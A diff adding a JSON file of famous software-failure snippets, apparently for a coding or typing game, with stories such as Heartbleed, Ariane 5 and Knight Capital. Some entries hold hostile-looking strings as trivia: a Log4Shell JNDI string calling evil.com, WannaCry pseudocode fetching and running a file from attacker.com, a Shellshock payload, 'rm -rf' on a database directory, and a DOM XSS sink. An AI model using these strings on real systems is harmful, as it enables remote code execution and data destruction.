@@ -1,0 +1,541 @@
+{
+  "superSnippets": [
+    {
+      "id": "cloudflare-regex-2019",
+      "code": "(?:(?:\\\"|'|\\]|\\}|\\\\|\\d|(?:nan|infinity|true|false|null|undefined|symbol|math)|\\`|\\-|\\+)+[)]*;?((?:\\s|-|~|!|{}|\\|\\||\\+)*.*(?:.*=.*)))",
+      "language": "regex",
+      "length": "long",
+      "difficulty": "hard",
+      "story": "Cloudflare Global Outage - July 2, 2019",
+      "description": "This regex caused a 27-minute worldwide outage affecting millions of websites. The pattern was designed to detect XSS attacks but caused catastrophic backtracking, spiking CPU usage to 100% across all Cloudflare edge servers globally.",
+      "impact": "Global internet disruption, affected major sites like Discord, Shopify, and millions of others",
+      "tags": [
+        "regex",
+        "catastrophic-backtracking",
+        "production-outage",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "left-pad-2016",
+      "code": "module.exports = leftpad;\n\nfunction leftpad (str, len, ch) {\n\tstr = String(str);\n\tvar i = -1;\n\tif (!ch && ch !== 0) ch = ' ';\n\tlen = len - str.length;\n\twhile (++i < len) {\n\t\tstr = ch + str;\n\t}\n\treturn str;\n}",
+      "language": "javascript",
+      "length": "long",
+      "difficulty": "easy",
+      "story": "The 11 Lines That Broke the Internet - March 22, 2016",
+      "description": "When developer Azer Koçulu unpublished this 11-line npm package in protest, it broke React, Babel, and thousands of other projects. Major companies like Facebook, Netflix, and Spotify were affected. The package had 2.5 million downloads per month.",
+      "impact": "Broke the entire JavaScript ecosystem for hours",
+      "tags": [
+        "javascript",
+        "npm",
+        "dependency-hell",
+        "infamous",
+        "supply-chain"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "stackoverflow-regex-2016",
+      "code": "^[\\s\\u200c]+|[\\s\\u200c]+$",
+      "language": "regex",
+      "length": "short",
+      "difficulty": "medium",
+      "story": "Stack Overflow 34-Minute Outage - July 20, 2016",
+      "description": "A malformed post with 20,000 consecutive whitespace characters caused this regex to perform 199,990,000 checks due to catastrophic backtracking. The regex was intended to trim unicode whitespace from strings.",
+      "impact": "34-minute complete site outage",
+      "tags": [
+        "regex",
+        "catastrophic-backtracking",
+        "stackoverflow",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "stackoverflow-regex-simplified",
+      "code": "\\s+$",
+      "language": "regex",
+      "length": "short",
+      "difficulty": "easy",
+      "story": "Stack Overflow Outage (Simplified Pattern)",
+      "description": "The simplified version of the regex that killed Stack Overflow. Looks innocent - just 'match all spaces at end of string' - but with 20,000 spaces not at the end, it causes exponential backtracking.",
+      "impact": "Demonstrates how simple patterns can be dangerous",
+      "tags": [
+        "regex",
+        "catastrophic-backtracking",
+        "simple-but-deadly"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "heartbleed-memcpy",
+      "code": "hbtype = *p++;\nn2s(p, payload);\npl = p;\n\nif (hbtype == TLS1_HB_REQUEST) {\n\t\tunsigned char *buffer, *bp;\n\t\tint r;\n\t\t\n\t\tbuffer = OPENSSL_malloc(1 + 2 + payload + padding);\n\t\tbp = buffer;\n\t\t\n\t\t*bp++ = TLS1_HB_RESPONSE;\n\t\ts2n(payload, bp);\n\t\tmemcpy(bp, pl, payload);\n}",
+      "language": "c",
+      "length": "long",
+      "difficulty": "hard",
+      "story": "Heartbleed - April 2014",
+      "description": "Missing bounds check in OpenSSL's heartbeat implementation. The memcpy() uses unsanitized user input (payload) as length parameter, allowing attackers to read 64KB of server memory at a time. Affected 17% of all secure web servers.",
+      "impact": "Affected 17% of all secure web servers worldwide, billions of users, exposed passwords and private keys",
+      "tags": [
+        "c",
+        "security",
+        "openssl",
+        "memory-vulnerability",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "goto-fail",
+      "code": "if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)\n\t\tgoto fail;\n\t\tgoto fail;",
+      "language": "c",
+      "length": "short",
+      "difficulty": "easy",
+      "story": "Apple's 'goto fail' Bug - February 2014",
+      "description": "The duplicate 'goto fail' line bypassed critical SSL certificate validation in iOS and OS X. This meant any SSL connection could be intercepted without warning. Likely caused by a merge conflict or copy-paste error.",
+      "impact": "Broke SSL/TLS security on all iOS and Mac devices",
+      "tags": [
+        "c",
+        "security",
+        "apple",
+        "ssl",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "ariane-5-overflow",
+      "code": "L_M_BV_32 := TBD.T_ENTIER_32S ((1.0/C_M_LSB_BV) * G_M_INFO_DERIVE(T_ALG.E_BV));\n\nif L_M_BV_32 > 32767 then\n\t\tP_M_DERIVE(T_ALG.E_BV) := 16#7FFF#;\nelsif L_M_BV_32 < -32768 then\n\t\tP_M_DERIVE(T_ALG.E_BV) := 16#8000#;\nelse\n\t\tP_M_DERIVE(T_ALG.E_BV) := UC_16S_EN_16NS(TDB.T_ENTIER_16S(L_M_BV_32));\nend if;\n\nP_M_DERIVE(T_ALG.E_BH) := UC_16S_EN_16NS(TDB.T_ENTIER_16S((1.0/C_M_LSB_BH) * G_M_INFO_DERIVE(T_ALG.E_BH)));",
+      "language": "ada",
+      "length": "long",
+      "difficulty": "medium",
+      "story": "Ariane 5 Rocket Explosion - June 4, 1996",
+      "description": "The last line lacks overflow protection that the E_BV variable has. Converting 64-bit float horizontal velocity to 16-bit signed integer caused processor trap. The code was reused from Ariane 4 where velocities were lower. Ran for 40 seconds after liftoff even though only needed pre-launch.",
+      "impact": "$370 million loss, rocket destroyed 37 seconds after launch",
+      "tags": [
+        "ada",
+        "integer-overflow",
+        "space",
+        "expensive-bug",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "gitlab-rm-rf",
+      "code": "$ rm -rf /var/opt/gitlab/postgresql/data",
+      "language": "bash",
+      "length": "short",
+      "difficulty": "easy",
+      "story": "GitLab Database Deletion - January 31, 2017",
+      "description": "Sleep-deprived engineer accidentally ran 'rm -rf' on the production database directory instead of a secondary. Deleted 300GB of production data. They live-streamed the recovery effort. Backups had been failing for months.",
+      "impact": "Lost 6 hours of production data, massive embarrassment",
+      "tags": [
+        "bash",
+        "database",
+        "rm-rf",
+        "live-streamed",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "log4shell",
+      "code": "${jndi:ldap://evil.com/a}",
+      "language": "java",
+      "length": "short",
+      "difficulty": "hard",
+      "story": "Log4Shell - December 2021",
+      "description": "Zero-day vulnerability in Log4j (used by millions of Java apps). Attackers could execute arbitrary code by logging this string. One of the most serious security vulnerabilities ever discovered. Billions of devices affected.",
+      "impact": "Billions of devices vulnerable, massive global patching effort",
+      "tags": [
+        "java",
+        "security",
+        "rce",
+        "zero-day",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "apple-ssl-validation",
+      "code": "if ((err = SSLHashSHA1.update(&hashCtx, &serverRandom)) != 0)\n\tgoto fail;\nif ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)\n\tgoto fail;\n\tgoto fail;",
+      "language": "c",
+      "length": "medium",
+      "difficulty": "easy",
+      "story": "Apple SSL 'goto fail' - Complete Code",
+      "description": "The full context of Apple's infamous SSL bug. The duplicate 'goto fail' was not indented, making it execute unconditionally and skip the critical signature verification.",
+      "impact": "All iOS and Mac SSL connections compromised",
+      "tags": [
+        "c",
+        "security",
+        "ssl",
+        "apple",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "morris-worm-gets",
+      "code": "gets(buffer);",
+      "language": "c",
+      "length": "short",
+      "difficulty": "easy",
+      "story": "Morris Worm - November 2, 1988",
+      "description": "First major internet worm exploited gets() buffer overflow in fingerd and other vulnerabilities. Infected 6,000 computers (10% of internet at the time). Creator was first person convicted under Computer Fraud and Abuse Act.",
+      "impact": "First major internet worm, creator criminally prosecuted",
+      "tags": [
+        "c",
+        "worm",
+        "buffer-overflow",
+        "historic",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "therac-25-race-condition",
+      "code": "if (set_energy() == 0) {\n\t\tif (set_mode() == 0) {\n\t\t\t\tbeam_ready = true;\n\t\t}\n}",
+      "language": "c",
+      "length": "medium",
+      "difficulty": "medium",
+      "story": "Therac-25 Radiation Overdoses - 1985-1987",
+      "description": "Race condition in radiation therapy machine software. When operators quickly changed settings, the machine would fire high-energy electron beam without protective tungsten shield. No hardware safety interlocks - relied entirely on software.",
+      "impact": "6 patients received massive radiation overdoses, 3 died",
+      "tags": [
+        "c",
+        "race-condition",
+        "medical",
+        "fatal",
+        "infamous"
+      ],
+      "codeAccuracy": "representative"
+    },
+    {
+      "id": "knight-capital-flag-reuse",
+      "code": "if (PowerPeg == true) {\n\t\tExecuteTrade(symbol, oldShareCount);\n}",
+      "language": "c",
+      "length": "short",
+      "difficulty": "medium",
+      "story": "Knight Capital Trading Glitch - August 1, 2012",
+      "description": "Deployed new trading software but one of 8 servers didn't get updated. Old dormant code got activated by new flag value. Sent millions of erroneous orders in 45 minutes, buying high and selling low on 150 stocks.",
+      "impact": "$460 million loss in 45 minutes, company nearly bankrupted",
+      "tags": [
+        "c",
+        "trading",
+        "deployment-error",
+        "expensive-bug",
+        "infamous"
+      ],
+      "codeAccuracy": "representative"
+    },
+    {
+      "id": "mars-climate-orbiter",
+      "code": "force = calculateForce();\nthrust = force * CONVERSION_FACTOR;",
+      "language": "c",
+      "length": "short",
+      "difficulty": "easy",
+      "story": "Mars Climate Orbiter - September 23, 1999",
+      "description": "Unit mismatch between Lockheed Martin's navigation software (imperial units) and NASA's software (metric units). Off by factor of 4.45. Caused spacecraft to enter Mars atmosphere at wrong angle and disintegrate.",
+      "impact": "$327 million spacecraft destroyed",
+      "tags": [
+        "c",
+        "units",
+        "space",
+        "integration-error",
+        "expensive-bug",
+        "infamous"
+      ],
+      "codeAccuracy": "representative"
+    },
+    {
+      "id": "pentium-fdiv-bug",
+      "code": "double result = 4195835.0 / 3145727.0;",
+      "language": "c",
+      "length": "short",
+      "difficulty": "medium",
+      "story": "Pentium FDIV Bug - 1994",
+      "description": "Faulty lookup table in Pentium's floating point division circuit. 5 entries out of 1066 were accidentally deleted during optimization. This specific division returned 1.333739068902037 instead of 1.333820449136241. Affected 1 in 9 billion division operations.",
+      "impact": "$475 million recall, massive PR disaster for Intel",
+      "tags": [
+        "c",
+        "hardware",
+        "floating-point",
+        "intel",
+        "expensive-bug",
+        "infamous"
+      ],
+      "codeAccuracy": "representative"
+    },
+    {
+      "id": "toyota-unintended-acceleration",
+      "code": "unsigned int X_ACCEL_ENABLE;\n\nif (X_ACCEL_ENABLE) {\n\t\ttargetSpeed = calculateSpeed();\n}",
+      "language": "c",
+      "length": "short",
+      "difficulty": "hard",
+      "story": "Toyota Unintended Acceleration - 2009-2010",
+      "description": "Complex embedded system with stack overflow potential, no memory protection, global variables that could be corrupted. Single bit flip could cause wide-open throttle. Code had 10,000+ global variables with 11,000+ possible task switches.",
+      "impact": "89 deaths, $1.2 billion fine, millions of recalls",
+      "tags": [
+        "c",
+        "embedded",
+        "automotive",
+        "fatal",
+        "infamous"
+      ],
+      "codeAccuracy": "representative"
+    },
+    {
+      "id": "aws-s3-typo-2017",
+      "code": "$ aws s3 rm --recursive s3://bucket/subsystem\n$ aws s3 rm --recursive s3://bucket/",
+      "language": "bash",
+      "length": "short",
+      "difficulty": "easy",
+      "story": "AWS S3 Outage - February 28, 2017",
+      "description": "Engineer debugging S3 billing system meant to remove small number of servers. Typo in command removed substantially more servers than intended, including servers for S3's own subsystem. Took 4 hours to restart.",
+      "impact": "4-hour outage affecting thousands of major websites and services",
+      "tags": [
+        "bash",
+        "typo",
+        "aws",
+        "cloud-outage",
+        "infamous"
+      ],
+      "codeAccuracy": "representative"
+    },
+    {
+      "id": "y2k-date-bug",
+      "code": "int year = 99;\nyear++;",
+      "language": "c",
+      "length": "short",
+      "difficulty": "easy",
+      "story": "Y2K Bug - January 1, 2000",
+      "description": "Decades of software stored years as two digits to save memory. When incrementing from 99 to 100, systems couldn't tell if it meant 2000 or 1900. $100+ billion spent worldwide to fix it before midnight.",
+      "impact": "Global crisis averted through massive remediation effort, $100+ billion spent",
+      "tags": [
+        "c",
+        "date",
+        "historic",
+        "expensive-bug",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "ganglia-null-terminator",
+      "code": "char buffer[256];\nstrncpy(buffer, input, 256);",
+      "language": "c",
+      "length": "short",
+      "difficulty": "medium",
+      "story": "Ganglia Buffer Overflow - 2012",
+      "description": "The strncpy function doesn't null-terminate if the source is 256+ characters. This led to a buffer overflow vulnerability in Ganglia monitoring system. Classic mistake of assuming strncpy always null-terminates.",
+      "impact": "Remote code execution vulnerability in widely-used monitoring software",
+      "tags": [
+        "c",
+        "buffer-overflow",
+        "security",
+        "strncpy",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "bash-shellshock",
+      "code": "() { :; }; /bin/bash -c 'echo vulnerable'",
+      "language": "bash",
+      "length": "short",
+      "difficulty": "hard",
+      "story": "Shellshock - September 2014",
+      "description": "Bash vulnerability where environment variables could contain code that executes when bash starts. Existed for 25 years undetected. Attackers could exploit via HTTP headers, DHCP clients, SSH, and more.",
+      "impact": "Hundreds of millions of systems vulnerable, critical infrastructure at risk",
+      "tags": [
+        "bash",
+        "security",
+        "rce",
+        "shellshock",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "windows-zune-leap-year",
+      "code": "while (days > 365) {\n\t\tif (IsLeapYear(year)) {\n\t\t\t\tif (days > 366) {\n\t\t\t\t\t\tdays -= 366;\n\t\t\t\t\t\tyear += 1;\n\t\t\t\t}\n\t\t} else {\n\t\t\t\tdays -= 365;\n\t\t\t\tyear += 1;\n\t\t}\n}",
+      "language": "c",
+      "length": "long",
+      "difficulty": "medium",
+      "story": "Zune Freeze - December 31, 2008",
+      "description": "On the last day of leap year 2008 (366th day), the loop would check if it's a leap year, see that days equals exactly 366, not greater than 366, so it wouldn't decrement. Infinite loop froze all 30GB Zune devices worldwide for 24 hours.",
+      "impact": "All Zune 30GB devices froze for 24 hours at midnight",
+      "tags": [
+        "c",
+        "date",
+        "infinite-loop",
+        "microsoft",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "debian-openssl-random",
+      "code": "MD_Update(&m,buf,j);\nMD_Update(&m,buf,j);",
+      "language": "c",
+      "length": "short",
+      "difficulty": "hard",
+      "story": "Debian OpenSSL Weak Keys - 2008",
+      "description": "Debian maintainer removed these two lines to fix a Valgrind warning about uninitialized memory. This accidentally removed the primary source of entropy, making SSL keys predictable. Only 32,768 possible keys instead of billions. Affected SSH keys, SSL certificates for 2 years.",
+      "impact": "Millions of weak cryptographic keys generated, 2 years undetected",
+      "tags": [
+        "c",
+        "security",
+        "cryptography",
+        "openssl",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "json-hijacking",
+      "code": "while(1);\n{\"user\":\"admin\",\"secret\":\"data\"}",
+      "language": "javascript",
+      "length": "short",
+      "difficulty": "medium",
+      "story": "JSON Hijacking Attack - 2007",
+      "description": "Attackers could steal JSON data by overriding Array constructor. Google and other major sites added 'while(1);' prefix to JSON responses to break the attack. The infinite loop prevents the JSON from being valid JavaScript that could be executed via script tags.",
+      "impact": "Major security vulnerability affecting Google, Yahoo, and others",
+      "tags": [
+        "javascript",
+        "security",
+        "json",
+        "web",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "sql-slammer-worm",
+      "code": "DECLARE @S NVARCHAR(4000)\nSET @S=CAST(0x44004500... AS NVARCHAR(4000))\nEXEC(@S)",
+      "language": "sql",
+      "length": "medium",
+      "difficulty": "hard",
+      "story": "SQL Slammer Worm - January 25, 2003",
+      "description": "Exploited buffer overflow in MS SQL Server 2000. The entire worm was 376 bytes and fit in a single UDP packet. Doubled infections every 8.5 seconds, infected 75,000 servers in 10 minutes. Crashed Bank of America ATMs, disrupted flights, emergency 911 systems.",
+      "impact": "Fastest spreading worm ever, global internet disruption in 10 minutes",
+      "tags": [
+        "sql",
+        "worm",
+        "buffer-overflow",
+        "microsoft",
+        "infamous"
+      ],
+      "codeAccuracy": "representative"
+    },
+    {
+      "id": "ethereum-parity-kill",
+      "code": "function kill() public {\n\t\trequire(msg.sender == creator);\n\t\tselfdestruct(msg.sender);\n}",
+      "language": "solidity",
+      "length": "short",
+      "difficulty": "hard",
+      "story": "Parity Wallet Freeze - November 6, 2017",
+      "description": "Developer accidentally became owner of library contract that all Parity multisig wallets depended on, then called kill() function. This destroyed the library, permanently freezing $280 million in 587 wallets. Funds are still frozen today.",
+      "impact": "$280 million permanently frozen in Ethereum wallets",
+      "tags": [
+        "solidity",
+        "ethereum",
+        "blockchain",
+        "expensive-bug",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "ping-of-death",
+      "code": "ping -l 65510 target.com",
+      "language": "bash",
+      "length": "short",
+      "difficulty": "easy",
+      "story": "Ping of Death - 1996",
+      "description": "Sending ICMP packet larger than 65,535 bytes caused buffer overflow and crashed systems. The oversized packet would be fragmented, and when reassembled, would overflow the buffer. Affected nearly all operating systems including Windows, Mac, Linux, Unix.",
+      "impact": "Could crash almost any networked computer remotely",
+      "tags": [
+        "bash",
+        "network",
+        "buffer-overflow",
+        "dos",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "wannacry-eternalblue",
+      "code": "if (exploited) {\n\t\tdownload_and_execute(\"http://attacker.com/wannacry.exe\");\n\t\tencrypt_files();\n\t\tfor (ip in random_ips) {\n\t\t\t\texploit(ip);\n\t\t}\n}",
+      "language": "pseudocode",
+      "length": "medium",
+      "difficulty": "hard",
+      "story": "WannaCry Ransomware - May 2017",
+      "description": "Exploited EternalBlue SMB vulnerability leaked from NSA. Self-propagating ransomware encrypted files and demanded Bitcoin. Spread to 200,000+ computers in 150 countries in hours. Crippled NHS hospitals, factories, government agencies worldwide.",
+      "impact": "200,000+ computers infected, billions in damages, hospitals shut down",
+      "tags": [
+        "ransomware",
+        "worm",
+        "nsa-exploit",
+        "infamous"
+      ],
+      "codeAccuracy": "representative"
+    },
+    {
+      "id": "jquery-dom-xss",
+      "code": "$('#element').html(location.hash.slice(1));",
+      "language": "javascript",
+      "length": "short",
+      "difficulty": "medium",
+      "story": "DOM-based XSS Pattern",
+      "description": "Extremely common XSS vulnerability pattern found across thousands of websites. Takes user input from URL fragment (after #) and directly inserts into DOM without sanitization. Attackers can execute arbitrary JavaScript. This exact pattern has been exploited in major sites.",
+      "impact": "One of the most common XSS patterns, found in countless websites",
+      "tags": [
+        "javascript",
+        "security",
+        "xss",
+        "jquery",
+        "common-vulnerability"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "bitcoin-value-overflow",
+      "code": "if (nValueOut > MAX_MONEY)\n\t\treturn false;",
+      "language": "c++",
+      "length": "short",
+      "difficulty": "medium",
+      "story": "Bitcoin Value Overflow - August 15, 2010",
+      "description": "Transaction created 184 billion bitcoins due to integer overflow. The check validated each output was < MAX_MONEY, but didn't check if sum of outputs overflowed. Someone created two outputs of 92 billion bitcoins each. Fixed within hours by rolling back blockchain.",
+      "impact": "Created 184 billion BTC, required blockchain rollback",
+      "tags": [
+        "c++",
+        "bitcoin",
+        "integer-overflow",
+        "blockchain",
+        "infamous"
+      ],
+      "codeAccuracy": "exact"
+    },
+    {
+      "id": "mount-gox-transaction-malleability",
+      "code": "if (txid == withdrawal_txid) {\n\t\tmark_as_sent(withdrawal);\n}",
+      "language": "pseudocode",
+      "length": "short",
+      "difficulty": "hard",
+      "story": "Mt. Gox Collapse - 2014",
+      "description": "Relied on transaction IDs to track withdrawals, but Bitcoin txids could be modified before confirmation (transaction malleability). Attackers modified txids, Mt. Gox didn't see 'match', resent coins. Combined with other issues, led to loss of 850,000 BTC ($450M at time).",
+      "impact": "850,000 BTC stolen (~$450M), largest Bitcoin exchange collapsed",
+      "tags": [
+        "bitcoin",
+        "security",
+        "transaction-malleability",
+        "expensive-bug",
+        "infamous"
+      ],
+      "codeAccuracy": "representative"
+    }
+  ]
+}
